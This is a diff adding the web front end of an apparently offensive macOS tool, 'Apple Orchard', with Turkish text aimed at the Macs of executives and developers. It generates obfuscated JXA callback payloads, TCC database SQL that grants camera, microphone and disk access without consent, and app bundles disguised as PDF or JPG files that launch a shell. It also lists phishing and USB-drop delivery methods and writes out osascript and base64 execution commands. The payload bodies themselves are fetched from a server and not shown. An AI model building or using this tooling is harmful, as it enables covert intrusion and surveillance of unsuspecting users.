@@ -1,0 +1,925 @@
+{% extends "base.html" %}
+{% block title %}Apple Orchard - MacOS Operations{% endblock %}
+
+{% block extra_css %}
+<style>
+    /* Button Styles */
+    .btn {
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+        padding: 12px 20px;
+        font-size: 14px;
+        font-weight: 600;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        border: 2px solid transparent;
+    }
+    
+    .btn-apple {
+        background: linear-gradient(135deg, #a3aaae, #7d8487) !important;
+        color: #fff !important;
+        border-color: #a3aaae !important;
+    }
+    
+    .btn-apple:hover {
+        background: linear-gradient(135deg, #7d8487, #555) !important;
+        box-shadow: 0 0 25px rgba(163, 170, 174, 0.5);
+        transform: translateY(-2px);
+    }
+    
+    .btn-success {
+        background: linear-gradient(135deg, #00ff88, #00cc6a) !important;
+        color: #000 !important;
+        border-color: #00ff88 !important;
+    }
+    
+    .btn-success:hover {
+        background: linear-gradient(135deg, #00cc6a, #009950) !important;
+        box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+    }
+    
+    .btn-danger {
+        background: linear-gradient(135deg, #ff4444, #cc0000) !important;
+        color: #fff !important;
+        border-color: #ff4444 !important;
+    }
+    
+    .btn-danger:hover {
+        background: linear-gradient(135deg, #cc0000, #990000) !important;
+        box-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
+    }
+    
+    .btn-warning {
+        background: linear-gradient(135deg, #ffcc00, #ff9500) !important;
+        color: #000 !important;
+        border-color: #ffcc00 !important;
+    }
+    
+    .btn-warning:hover {
+        background: linear-gradient(135deg, #ff9500, #ff6600) !important;
+        box-shadow: 0 0 20px rgba(255, 149, 0, 0.5);
+    }
+    
+    .btn-outline-apple {
+        background: transparent !important;
+        color: #a3aaae !important;
+        border: 2px solid #a3aaae !important;
+    }
+    
+    .btn-outline-apple:hover {
+        background: rgba(163, 170, 174, 0.2) !important;
+    }
+    
+    .btn-sm { padding: 6px 12px; font-size: 12px; }
+    .btn-lg { padding: 15px 30px; font-size: 16px; }
+    
+    /* Card Styles */
+    .card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 1px solid #333;
+        border-radius: 12px;
+        overflow: hidden;
+    }
+    
+    .card-header {
+        background: rgba(0, 0, 0, 0.3);
+        border-bottom: 1px solid #333;
+        padding: 15px 20px;
+        color: #a3aaae;
+        font-weight: 600;
+    }
+    
+    .card-body { padding: 20px; }
+    
+    /* Form Styles */
+    .form-control, .form-select {
+        background-color: #1a1a2e !important;
+        border: 2px solid #a3aaae !important;
+        color: #fff !important;
+        padding: 12px 15px;
+        border-radius: 8px;
+    }
+    
+    .form-control:focus, .form-select:focus {
+        border-color: #fff !important;
+        box-shadow: 0 0 15px rgba(163, 170, 174, 0.3) !important;
+    }
+    
+    .form-control::placeholder { color: #666 !important; }
+    .form-label { color: #888; font-size: 14px; margin-bottom: 8px; display: block; }
+    
+    /* Apple Theme */
+    .apple-hero {
+        background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 50%, #1a1a2e 100%);
+        border-radius: 15px;
+        padding: 40px;
+        position: relative;
+        overflow: hidden;
+        margin-bottom: 30px;
+        border: 1px solid #a3aaae33;
+    }
+    
+    .apple-hero::before {
+        content: '';
+        position: absolute;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: radial-gradient(circle at 30% 50%, rgba(163, 170, 174, 0.1) 0%, transparent 50%);
+        pointer-events: none;
+    }
+    
+    .apple-icon {
+        font-size: 4rem;
+        margin-bottom: 15px;
+        filter: drop-shadow(0 0 20px rgba(163, 170, 174, 0.5));
+    }
+    
+    /* Operation Cards */
+    .operation-card {
+        background: linear-gradient(145deg, #1a1a2e, #16213e);
+        border: 2px solid #333;
+        border-radius: 15px;
+        padding: 25px;
+        text-align: center;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        height: 100%;
+    }
+    
+    .operation-card:hover {
+        transform: translateY(-5px);
+        border-color: #a3aaae;
+        box-shadow: 0 0 30px rgba(163, 170, 174, 0.3);
+    }
+    
+    .operation-card.jxa:hover { border-color: #ffcc00; box-shadow: 0 0 30px rgba(255, 204, 0, 0.3); }
+    .operation-card.tcc:hover { border-color: #ff4444; box-shadow: 0 0 30px rgba(255, 68, 68, 0.3); }
+    .operation-card.bundle:hover { border-color: #00bfff; box-shadow: 0 0 30px rgba(0, 191, 255, 0.3); }
+    
+    .operation-icon { font-size: 3rem; margin-bottom: 10px; }
+    .operation-name { font-size: 1.1rem; font-weight: bold; color: #fff; margin-bottom: 8px; }
+    .operation-desc { color: #888; font-size: 0.85rem; }
+    
+    /* Tabs */
+    .nav-tabs {
+        border-bottom: 2px solid #333;
+    }
+    
+    .nav-tabs .nav-link {
+        background: transparent;
+        border: none;
+        color: #888;
+        padding: 15px 25px;
+        font-weight: 600;
+    }
+    
+    .nav-tabs .nav-link:hover { color: #fff; }
+    
+    .nav-tabs .nav-link.active {
+        color: #a3aaae;
+        border-bottom: 3px solid #a3aaae;
+    }
+    
+    /* Code Display */
+    .code-display {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Menlo', 'Monaco', 'Courier New', monospace;
+        font-size: 0.8rem;
+        color: #a3aaae;
+        max-height: 400px;
+        overflow-y: auto;
+        white-space: pre-wrap;
+    }
+    
+    .code-display.jxa { color: #ffcc00; }
+    .code-display.shell { color: #00ff88; }
+    .code-display.sql { color: #ff6b6b; }
+    
+    /* Terminal */
+    .terminal-output {
+        background: #0a0a0a;
+        border: 1px solid #333;
+        border-radius: 8px;
+        padding: 15px;
+        font-family: 'Menlo', monospace;
+        font-size: 0.85rem;
+        color: #00ff88;
+        max-height: 200px;
+        overflow-y: auto;
+    }
+    
+    /* Payload Type Cards */
+    .payload-type-card {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid #444;
+        border-radius: 8px;
+        padding: 12px;
+        cursor: pointer;
+        transition: all 0.2s;
+        margin-bottom: 8px;
+    }
+    
+    .payload-type-card:hover {
+        border-color: #ffcc00;
+        background: rgba(255, 204, 0, 0.1);
+    }
+    
+    .payload-type-card.selected {
+        border-color: #ffcc00;
+        background: rgba(255, 204, 0, 0.2);
+    }
+    
+    /* Permission List */
+    .permission-item {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        padding: 10px 15px;
+        background: rgba(0, 0, 0, 0.3);
+        border-radius: 8px;
+        margin-bottom: 8px;
+    }
+    
+    .permission-item .risk-high { color: #ff4444; }
+    .permission-item .risk-critical { color: #ff0000; font-weight: bold; }
+    .permission-item .risk-medium { color: #ffcc00; }
+    
+    /* Badge */
+    .badge {
+        padding: 5px 10px;
+        border-radius: 5px;
+        font-size: 0.75rem;
+        font-weight: 600;
+    }
+    
+    .bg-apple { background: rgba(163, 170, 174, 0.2) !important; color: #a3aaae !important; }
+    .bg-success { background: rgba(0, 255, 136, 0.2) !important; color: #00ff88 !important; }
+    .bg-warning { background: rgba(255, 204, 0, 0.2) !important; color: #ffcc00 !important; }
+    .bg-danger { background: rgba(255, 68, 68, 0.2) !important; color: #ff4444 !important; }
+    .bg-info { background: rgba(0, 191, 255, 0.2) !important; color: #00bfff !important; }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="container-fluid">
+    <!-- Hero -->
+    <div class="apple-hero">
+        <div class="row align-items-center">
+            <div class="col-md-8">
+                <h1 class="text-white mb-3">
+                    <span style="font-size: 3rem;">🍎</span>
+                    The Apple Orchard
+                </h1>
+                <p class="text-secondary mb-0" style="font-size: 1.1rem;">
+                    MacOS Operations Suite - CEO'ların ve yazılımcıların Mac'lerini hedefle.
+                    JXA payloads, TCC bypass, disguised app bundles.
+                </p>
+            </div>
+            <div class="col-md-4 text-end">
+                <span class="badge bg-apple me-2"> macOS</span>
+                <span class="badge bg-warning">⚡ STEALTH</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Operation Cards -->
+    <div class="row mb-4">
+        <div class="col-md-4 mb-3">
+            <div class="operation-card jxa" onclick="selectOperation('jxa')">
+                <div class="operation-icon">📜</div>
+                <div class="operation-name">JXA Payload Generator</div>
+                <div class="operation-desc">JavaScript for Automation - Apple'ın yerel otomasyon dili</div>
+                <div class="mt-3">
+                    <span class="badge bg-warning">Native</span>
+                    <span class="badge bg-success">Gatekeeper Bypass</span>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-4 mb-3">
+            <div class="operation-card tcc" onclick="selectOperation('tcc')">
+                <div class="operation-icon">🔓</div>
+                <div class="operation-name">TCC Database Manipulator</div>
+                <div class="operation-desc">Kamera/Mikrofon/FDA izinlerini kullanıcıya sormadan al</div>
+                <div class="mt-3">
+                    <span class="badge bg-danger">Requires SIP Bypass</span>
+                </div>
+            </div>
+        </div>
+        <div class="col-md-4 mb-3">
+            <div class="operation-card bundle" onclick="selectOperation('bundle')">
+                <div class="operation-icon">📦</div>
+                <div class="operation-name">App Bundle Backdoor</div>
+                <div class="operation-desc">PDF/JPG gibi görünen .app - çift tık ile shell</div>
+                <div class="mt-3">
+                    <span class="badge bg-info">Social Engineering</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Tabs -->
+    <ul class="nav nav-tabs mb-4">
+        <li class="nav-item">
+            <a class="nav-link active" data-bs-toggle="tab" href="#jxa-tab">
+                <span style="color: #ffcc00;">📜</span> JXA Payloads
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#tcc-tab">
+                <span style="color: #ff4444;">🔓</span> TCC Bypass
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" data-bs-toggle="tab" href="#bundle-tab">
+                <span style="color: #00bfff;">📦</span> App Bundle
+            </a>
+        </li>
+    </ul>
+
+    <div class="tab-content">
+        <!-- JXA Tab -->
+        <div class="tab-pane fade show active" id="jxa-tab">
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #ffcc00;">
+                            <i class="fas fa-scroll me-2"></i>JXA Payload Configuration
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                JXA (JavaScript for Automation) macOS'un yerel otomasyon dilidir.
+                                Gatekeeper ve XProtect bunu engellemez!
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Payload Type</label>
+                                <select class="form-select" id="jxa-payload-type">
+                                    {% for key, payload in jxa_payloads.items() %}
+                                    <option value="{{ key }}">{{ payload.name }}</option>
+                                    {% endfor %}
+                                </select>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Callback Host</label>
+                                <input type="text" class="form-control" id="jxa-host" value="10.0.0.1">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Callback Port</label>
+                                <input type="number" class="form-control" id="jxa-port" value="443">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Evasion Level</label>
+                                <select class="form-select" id="jxa-evasion">
+                                    <option value="1">Level 1 - Basic</option>
+                                    <option value="2" selected>Level 2 - Standard</option>
+                                    <option value="3">Level 3 - Paranoid</option>
+                                </select>
+                            </div>
+                            
+                            <div class="form-check mb-3">
+                                <input class="form-check-input" type="checkbox" id="jxa-obfuscate" checked>
+                                <label class="form-check-label text-secondary">
+                                    Obfuscate variable names
+                                </label>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-warning" onclick="generateJXA()">
+                                    <i class="fas fa-code me-1"></i> Generate JXA
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-info-circle me-2"></i>Neden JXA?
+                        </div>
+                        <div class="card-body">
+                            <ul class="text-secondary small mb-0">
+                                <li>macOS'un yerel dili - şüphe uyandırmaz</li>
+                                <li>Script Editor yetkisiyle çalışır</li>
+                                <li>.scpt dosyaları Gatekeeper'ı atlar</li>
+                                <li>ObjC bridge ile tüm macOS API'lerine erişim</li>
+                                <li>Mail, Keychain, Camera, Contacts erişimi</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-8">
+                    <div class="card">
+                        <div class="card-header d-flex justify-content-between" style="color: #ffcc00;">
+                            <span><i class="fas fa-code me-2"></i>Generated JXA Payload</span>
+                            <div>
+                                <button class="btn btn-sm btn-outline-apple me-2" onclick="copyJXA()">
+                                    <i class="fas fa-copy"></i> Copy
+                                </button>
+                                <button class="btn btn-sm btn-warning" onclick="downloadJXA()">
+                                    <i class="fas fa-download"></i> Download
+                                </button>
+                            </div>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display jxa" id="jxa-code" style="margin: 0; max-height: 500px;">
+// Click "Generate JXA" to create payload
+</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="card mt-4">
+                        <div class="card-header">
+                            <i class="fas fa-terminal me-2"></i>Execution Commands
+                        </div>
+                        <div class="card-body">
+                            <div class="code-display shell" id="jxa-commands">
+# Generate a payload first...
+</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- TCC Tab -->
+        <div class="tab-pane fade" id="tcc-tab">
+            <div class="row">
+                <div class="col-lg-5">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #ff4444;">
+                            <i class="fas fa-unlock me-2"></i>TCC Database Manipulation
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                TCC.db dosyası macOS'un izin veritabanıdır. Bu modül, kullanıcıya
+                                sormadan uygulamalara kamera, mikrofon ve disk erişimi verir.
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Target Application</label>
+                                <input type="text" class="form-control" id="tcc-target" value="/usr/bin/python3">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Permissions to Grant</label>
+                                <div style="max-height: 200px; overflow-y: auto;">
+                                    {% for key, perm in tcc_permissions.items() %}
+                                    <div class="form-check">
+                                        <input class="form-check-input tcc-perm-check" type="checkbox" 
+                                               value="{{ key }}" id="tcc-{{ key }}"
+                                               {% if key in ['kTCCServiceCamera', 'kTCCServiceMicrophone'] %}checked{% endif %}>
+                                        <label class="form-check-label text-secondary" for="tcc-{{ key }}">
+                                            {{ perm.name }} 
+                                            <span class="risk-{{ perm.risk|lower }}">[{{ perm.risk }}]</span>
+                                        </label>
+                                    </div>
+                                    {% endfor %}
+                                </div>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Method</label>
+                                <select class="form-select" id="tcc-method">
+                                    <option value="injection">SQL Injection</option>
+                                    <option value="backup">Backup Restore</option>
+                                </select>
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-danger" onclick="generateTCC()">
+                                    <i class="fas fa-unlock me-1"></i> Generate TCC Bypass
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-exclamation-triangle me-2 text-warning"></i>Requirements
+                        </div>
+                        <div class="card-body">
+                            <ul class="text-secondary small mb-0">
+                                <li>SIP (System Integrity Protection) disabled, OR</li>
+                                <li>Full Disk Access for executing process, OR</li>
+                                <li>Root privileges</li>
+                                <li class="text-warning">macOS 12.3+ has additional protections</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-7">
+                    <div class="card mb-4">
+                        <div class="card-header d-flex justify-content-between" style="color: #ff4444;">
+                            <span><i class="fas fa-database me-2"></i>SQL Injection Payload</span>
+                            <button class="btn btn-sm btn-outline-apple" onclick="copyTCCSQL()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display sql" id="tcc-sql" style="margin: 0;">
+-- Click "Generate TCC Bypass" to create SQL
+</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header d-flex justify-content-between" style="color: #00ff88;">
+                            <span><i class="fas fa-terminal me-2"></i>Shell Script</span>
+                            <button class="btn btn-sm btn-outline-apple" onclick="copyTCCShell()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display shell" id="tcc-shell" style="margin: 0;">
+# Click "Generate TCC Bypass" to create script
+</pre>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bundle Tab -->
+        <div class="tab-pane fade" id="bundle-tab">
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="card mb-4">
+                        <div class="card-header" style="color: #00bfff;">
+                            <i class="fas fa-box me-2"></i>App Bundle Backdoor
+                        </div>
+                        <div class="card-body">
+                            <p class="text-secondary small mb-3">
+                                PDF veya JPG gibi görünen ama aslında .app olan zararlı bundle.
+                                Çift tıklandığında gerçek dokümanı açar + shell başlatır.
+                            </p>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">App Name</label>
+                                <input type="text" class="form-control" id="bundle-name" value="Q4_Financial_Report">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Disguise Type</label>
+                                <select class="form-select" id="bundle-disguise">
+                                    {% for key, dtype in disguise_types.items() %}
+                                    <option value="{{ key }}">{{ dtype.name }} ({{ dtype.extension }})</option>
+                                    {% endfor %}
+                                </select>
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Callback Host</label>
+                                <input type="text" class="form-control" id="bundle-host" value="10.0.0.1">
+                            </div>
+                            
+                            <div class="mb-3">
+                                <label class="form-label">Callback Port</label>
+                                <input type="number" class="form-control" id="bundle-port" value="443">
+                            </div>
+                            
+                            <div class="d-grid gap-2">
+                                <button class="btn btn-info" onclick="generateBundle()">
+                                    <i class="fas fa-box me-1"></i> Generate Bundle
+                                </button>
+                                <button class="btn btn-outline-apple" onclick="downloadBundleScript()">
+                                    <i class="fas fa-download me-1"></i> Download Build Script
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-truck me-2"></i>Delivery Methods
+                        </div>
+                        <div class="card-body">
+                            <ul class="text-secondary small mb-0">
+                                <li>📧 Email attachment</li>
+                                <li>💬 Slack/Teams share</li>
+                                <li>📱 AirDrop nearby Macs</li>
+                                <li>💾 USB drop</li>
+                                <li>☁️ Cloud storage link</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="col-lg-8">
+                    <div class="card mb-4">
+                        <div class="card-header d-flex justify-content-between" style="color: #00bfff;">
+                            <span><i class="fas fa-file-code me-2"></i>Build Script</span>
+                            <button class="btn btn-sm btn-outline-apple" onclick="copyBundleScript()">
+                                <i class="fas fa-copy"></i>
+                            </button>
+                        </div>
+                        <div class="card-body p-0">
+                            <pre class="code-display shell" id="bundle-script" style="margin: 0; max-height: 400px;">
+# Click "Generate Bundle" to create build script
+</pre>
+                        </div>
+                    </div>
+                    
+                    <div class="card">
+                        <div class="card-header">
+                            <i class="fas fa-eye me-2"></i>Preview
+                        </div>
+                        <div class="card-body">
+                            <div class="row text-center">
+                                <div class="col-6">
+                                    <div class="p-3 bg-dark rounded">
+                                        <div style="font-size: 4rem;">📄</div>
+                                        <div class="text-secondary mt-2">Finder'da Görünüm</div>
+                                        <div class="text-white" id="bundle-preview-name">Q4_Financial_Report.pdf</div>
+                                    </div>
+                                </div>
+                                <div class="col-6">
+                                    <div class="p-3 bg-dark rounded">
+                                        <div style="font-size: 4rem;">📁</div>
+                                        <div class="text-secondary mt-2">Gerçek Yapı</div>
+                                        <div class="text-warning" id="bundle-real-name">Q4_Financial_Report.pdf.app</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Activity Log -->
+    <div class="row mt-4">
+        <div class="col-12">
+            <div class="card">
+                <div class="card-header d-flex justify-content-between">
+                    <span><i class="fas fa-terminal me-2"></i>Activity Log</span>
+                    <button class="btn btn-sm btn-outline-apple" onclick="clearLog()">
+                        <i class="fas fa-trash"></i>
+                    </button>
+                </div>
+                <div class="card-body p-0">
+                    <div class="terminal-output" id="activity-log">
+                        <div class="text-success">[+] Apple Orchard initialized</div>
+                        <div class="text-warning">[!] Target: macOS systems</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script>
+let currentJXAResult = null;
+let currentTCCResult = null;
+let currentBundleResult = null;
+
+function log(message, type = 'info') {
+    const logDiv = document.getElementById('activity-log');
+    const timestamp = new Date().toLocaleTimeString();
+    let color = 'text-secondary';
+    let prefix = '[*]';
+    
+    if (type === 'success') { color = 'text-success'; prefix = '[+]'; }
+    else if (type === 'error') { color = 'text-danger'; prefix = '[-]'; }
+    else if (type === 'warning') { color = 'text-warning'; prefix = '[!]'; }
+    else if (type === 'apple') { color = 'text-white'; prefix = '[🍎]'; }
+    
+    logDiv.innerHTML += `<div class="${color}">${prefix} [${timestamp}] ${message}</div>`;
+    logDiv.scrollTop = logDiv.scrollHeight;
+}
+
+function clearLog() {
+    document.getElementById('activity-log').innerHTML = '<div class="text-success">[+] Log cleared</div>';
+}
+
+function selectOperation(op) {
+    log(`Selected operation: ${op}`, 'apple');
+    // Activate corresponding tab
+    const tabMap = { 'jxa': '#jxa-tab', 'tcc': '#tcc-tab', 'bundle': '#bundle-tab' };
+    if (tabMap[op]) {
+        const tabEl = document.querySelector(`[href="${tabMap[op]}"]`);
+        if (tabEl) {
+            const tab = new bootstrap.Tab(tabEl);
+            tab.show();
+        }
+    }
+}
+
+async function generateJXA() {
+    const payloadType = document.getElementById('jxa-payload-type').value;
+    const host = document.getElementById('jxa-host').value;
+    const port = document.getElementById('jxa-port').value;
+    const evasion = document.getElementById('jxa-evasion').value;
+    const obfuscate = document.getElementById('jxa-obfuscate').checked;
+    
+    log(`Generating JXA payload: ${payloadType}`, 'apple');
+    
+    try {
+        const response = await fetch('/apple-orchard/api/jxa/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                payload_type: payloadType,
+                host: host,
+                port: parseInt(port),
+                evasion_level: parseInt(evasion),
+                obfuscate: obfuscate
+            })
+        });
+        
+        currentJXAResult = await response.json();
+        
+        if (currentJXAResult.success) {
+            document.getElementById('jxa-code').textContent = currentJXAResult.code;
+            
+            const commands = `# Run directly:
+osascript -l JavaScript -e '${currentJXAResult.code.substring(0, 50)}...'
+
+# Or save and run:
+echo '${currentJXAResult.outputs.base64}' | base64 -d > payload.js
+osascript -l JavaScript payload.js
+
+# Compile to .scpt (more stealthy):
+${currentJXAResult.outputs.compile_command}`;
+            
+            document.getElementById('jxa-commands').textContent = commands;
+            
+            log(`JXA payload generated: ${currentJXAResult.payload_id}`, 'success');
+            log(`Evasion level: ${evasion}/3`, 'info');
+        } else {
+            log(`Error: ${currentJXAResult.error}`, 'error');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function generateTCC() {
+    const target = document.getElementById('tcc-target').value;
+    const method = document.getElementById('tcc-method').value;
+    
+    const permissions = [];
+    document.querySelectorAll('.tcc-perm-check:checked').forEach(cb => {
+        permissions.push(cb.value);
+    });
+    
+    if (permissions.length === 0) {
+        log('No permissions selected', 'warning');
+        return;
+    }
+    
+    log(`Generating TCC bypass for ${target}`, 'apple');
+    log(`Permissions: ${permissions.join(', ')}`, 'info');
+    
+    try {
+        const response = await fetch('/apple-orchard/api/tcc/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                target_app: target,
+                permissions: permissions,
+                method: method
+            })
+        });
+        
+        currentTCCResult = await response.json();
+        
+        if (currentTCCResult.success) {
+            if (currentTCCResult.sql_commands) {
+                document.getElementById('tcc-sql').textContent = currentTCCResult.sql_commands.join('\n');
+            }
+            if (currentTCCResult.shell_script) {
+                document.getElementById('tcc-shell').textContent = currentTCCResult.shell_script;
+            }
+            
+            log('TCC bypass payload generated!', 'success');
+            log('⚠️ Requires SIP disabled or FDA', 'warning');
+        } else {
+            log(`Error: ${currentTCCResult.error}`, 'error');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+async function generateBundle() {
+    const appName = document.getElementById('bundle-name').value;
+    const disguise = document.getElementById('bundle-disguise').value;
+    const host = document.getElementById('bundle-host').value;
+    const port = document.getElementById('bundle-port').value;
+    
+    log(`Generating app bundle: ${appName}.${disguise}`, 'apple');
+    
+    try {
+        const response = await fetch('/apple-orchard/api/bundle/generate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                app_name: appName,
+                disguise: disguise,
+                host: host,
+                port: parseInt(port)
+            })
+        });
+        
+        currentBundleResult = await response.json();
+        
+        if (currentBundleResult.success) {
+            document.getElementById('bundle-script').textContent = currentBundleResult.build_script;
+            
+            // Update preview
+            const ext = currentBundleResult.bundle_name.replace('.app', '');
+            document.getElementById('bundle-preview-name').textContent = ext;
+            document.getElementById('bundle-real-name').textContent = currentBundleResult.bundle_name;
+            
+            log(`Bundle generated: ${currentBundleResult.bundle_name}`, 'success');
+            log(`Callback: ${host}:${port}`, 'info');
+        } else {
+            log(`Error: ${currentBundleResult.error}`, 'error');
+        }
+    } catch (error) {
+        log(`Error: ${error.message}`, 'error');
+    }
+}
+
+function copyJXA() {
+    if (currentJXAResult && currentJXAResult.code) {
+        navigator.clipboard.writeText(currentJXAResult.code);
+        log('JXA code copied!', 'success');
+    }
+}
+
+function downloadJXA() {
+    if (currentJXAResult && currentJXAResult.code) {
+        const blob = new Blob([currentJXAResult.code], { type: 'text/javascript' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `${currentJXAResult.payload_type}.js`;
+        a.click();
+        log('JXA payload downloaded', 'success');
+    }
+}
+
+function copyTCCSQL() {
+    const sql = document.getElementById('tcc-sql').textContent;
+    navigator.clipboard.writeText(sql);
+    log('TCC SQL copied!', 'success');
+}
+
+function copyTCCShell() {
+    const shell = document.getElementById('tcc-shell').textContent;
+    navigator.clipboard.writeText(shell);
+    log('TCC shell script copied!', 'success');
+}
+
+function copyBundleScript() {
+    const script = document.getElementById('bundle-script').textContent;
+    navigator.clipboard.writeText(script);
+    log('Bundle script copied!', 'success');
+}
+
+function downloadBundleScript() {
+    if (currentBundleResult && currentBundleResult.build_script) {
+        const blob = new Blob([currentBundleResult.build_script], { type: 'text/x-shellscript' });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `build_${document.getElementById('bundle-name').value}.sh`;
+        a.click();
+        log('Build script downloaded', 'success');
+    }
+}
+
+// Update preview on input change
+document.getElementById('bundle-name')?.addEventListener('input', function() {
+    const disguise = document.getElementById('bundle-disguise');
+    const ext = disguise.options[disguise.selectedIndex].text.match(/\(([^)]+)\)/)?.[1] || '.pdf';
+    document.getElementById('bundle-preview-name').textContent = this.value + ext;
+    document.getElementById('bundle-real-name').textContent = this.value + ext + '.app';
+});
+
+document.getElementById('bundle-disguise')?.addEventListener('change', function() {
+    const name = document.getElementById('bundle-name').value;
+    const ext = this.options[this.selectedIndex].text.match(/\(([^)]+)\)/)?.[1] || '.pdf';
+    document.getElementById('bundle-preview-name').textContent = name + ext;
+    document.getElementById('bundle-real-name').textContent = name + ext + '.app';
+});
+
+// Initialize
+document.addEventListener('DOMContentLoaded', function() {
+    log('Apple Orchard ready - macOS operations suite', 'success');
+});
+</script>
+{% endblock %}
